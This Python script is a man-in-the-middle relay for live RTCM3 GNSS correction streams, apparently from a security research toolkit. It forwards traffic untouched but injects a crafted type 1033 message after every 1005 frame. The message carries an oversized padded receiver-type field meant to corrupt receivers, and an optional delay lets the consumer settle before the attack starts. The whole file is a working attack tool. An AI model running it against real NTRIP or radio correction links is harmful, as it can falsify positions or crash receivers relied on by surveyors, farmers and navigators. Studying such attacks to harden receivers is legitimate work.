#!/usr/bin/env python3
"""
On-path relay that splices a malicious type 1033 into a live RTCM3 stream.

Sits between a correction source and its consumer, forwarding everything
unchanged and adding one extra message. This is the same splice
`inject_1033.py` performs on a file, but against a live stream -- which is what
an attacker on an NTRIP path or a correction radio link actually does.

Nothing is dropped or rewritten. The attack is purely additive: the legitimate
stream continues to work, and one extra well-formed message rides along with
it.

A real base station re-sends 1005 periodically, which restores the true
coordinates, so the 1033 is injected after every 1005 to hold the corruption.

    inject_relay.py --listen 5911 --upstream 127.0.0.1:5901 --len 212

Consumers then connect to :5911 instead of :5901.
"""
import argparse
import socket
import sys
import threading
import time

from gen_rtcm import msg1033, crc24q


class Splicer:
    """Frame-aligned RTCM3 splicer over a byte stream."""

    def __init__(self, blob, after=1005, once=False):
        self.buf = bytearray()
        self.blob = blob
        self.after = after
        self.once = once
        self.injected = 0
        self.frames = 0

    def feed(self, data):
        """Return the outbound bytes for this chunk."""
        self.buf += data
        out = bytearray()
        i = 0
        while True:
            # Find a frame preamble.
            while i < len(self.buf) and self.buf[i] != 0xD3:
                i += 1
            if i + 3 > len(self.buf):
                break
            length = ((self.buf[i + 1] & 0x03) << 8) | self.buf[i + 2]
            end = i + 3 + length + 3
            if end > len(self.buf):
                break
            frame = bytes(self.buf[i:end])
            if crc24q(frame[:-3]) != int.from_bytes(frame[-3:], "big"):
                i += 1        # not a real frame, resynchronise
                continue
            self.frames += 1
            out += frame
            msgtype = (frame[3] << 4) | (frame[4] >> 4)
            if msgtype == self.after and not (self.once and self.injected):
                staid = ((frame[4] & 0x0F) << 8) | frame[5]
                out += msg1033(staid=staid, antdes=b"TRM59800.00",
                               rectype=self.blob)
                self.injected += 1
            i = end
        del self.buf[:i]
        return bytes(out)


def pump(src, dst, splicer, stats):
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            dst.sendall(splicer.feed(data) if splicer else data)
            stats["bytes"] += len(data)
    except OSError:
        pass
    finally:
        for s in (src, dst):
            try:
                s.close()
            except OSError:
                pass


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--listen", type=int, required=True)
    ap.add_argument("--upstream", required=True, help="host:port")
    ap.add_argument("--len", type=int, default=212,
                    help="declared rectype length (0 disables injection)")
    ap.add_argument("--after", type=int, default=1005)
    ap.add_argument("--delay", type=float, default=0.0,
                    help="seconds to forward cleanly before injecting")
    args = ap.parse_args()

    host, port = args.upstream.rsplit(":", 1)
    blob = b"A" * 31 + b"\xff" * (args.len - 31) if args.len > 31 else b""

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("", args.listen))
    srv.listen(4)
    print(f"relay listening on :{args.listen} -> {args.upstream}", flush=True)
    if args.len:
        print(f"injecting 1033 rectype len={args.len} after every {args.after}"
              f"{f', starting {args.delay:.0f}s in' if args.delay else ''}",
              flush=True)

    while True:
        cli, addr = srv.accept()
        try:
            up = socket.create_connection((host, int(port)), timeout=5)
        except OSError as e:
            print(f"upstream connect failed: {e}", file=sys.stderr)
            cli.close()
            continue
        print(f"client {addr[0]}:{addr[1]} connected", flush=True)

        splicer = Splicer(blob) if args.len else None
        stats = {"bytes": 0}

        if splicer and args.delay:
            # Forward cleanly first so the consumer can converge on a good fix
            # before anything is injected. Same splicer throughout, with
            # injection armed by setting the message type it triggers on --
            # a second instance would leave the reported counts on whichever
            # one was not doing the work.
            splicer.after = -1
            t = threading.Thread(target=pump, args=(up, cli, splicer, stats),
                                 daemon=True)
            t.start()
            time.sleep(args.delay)
            print(f"--- ATTACK: injecting after every {args.after} ---",
                  flush=True)
            splicer.after = args.after
            t.join()
        else:
            pump(up, cli, splicer, stats)

        print(f"client gone: {stats['bytes']} bytes, "
              f"{splicer.frames if splicer else 0} frames, "
              f"{splicer.injected if splicer else 0} injected", flush=True)


if __name__ == "__main__":
    main()
